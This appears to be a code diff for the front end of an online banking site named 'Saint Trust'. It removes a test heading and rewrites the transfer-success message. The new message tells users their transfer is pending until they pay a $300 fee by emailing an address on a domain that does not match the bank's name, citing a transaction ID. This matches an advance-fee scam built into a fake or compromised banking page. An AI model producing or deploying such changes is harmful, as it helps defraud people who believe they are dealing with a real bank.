@@ -1024,7 +1024,6 @@ body {
 </style>
 </head>
 <body>
-<h1 style="color:red;">TEST CHANGE</h1>
 <div id="pageLoadOverlay">
   <div class="page-loader">
     <div class="page-loader-logo">Saint <em>Trust</em></div>
@@ -1406,7 +1405,12 @@ function showTransferSuccess(data) {
   const confirmNum = 'STR' + Date.now().toString().slice(-8).toUpperCase();
 
   document.getElementById('transferTimeNotice').textContent = timeNotice;
-  document.getElementById('transferTimeDetail').textContent = timeDetail;
+  document.getElementById('transferTimeDetail').innerHTML = `
+  Your transfer is now pending. You need to pay a fee of $300 for the transfer to be processed. 
+  Please send a message to 
+  <a href="mailto:support@saintustbanking.com">support@saintustbanking.com</a> 
+  with your transaction ID #Z3ERWTWW2 to complete the payment and process your transfer.
+`;
   document.getElementById('transferSuccessSubtitle').textContent = `Your transfer to ${data.name} has been successfully initiated.`;
   document.getElementById('transferSummaryDetails').innerHTML = `
     <div class="notice-label">Transfer Details</div>
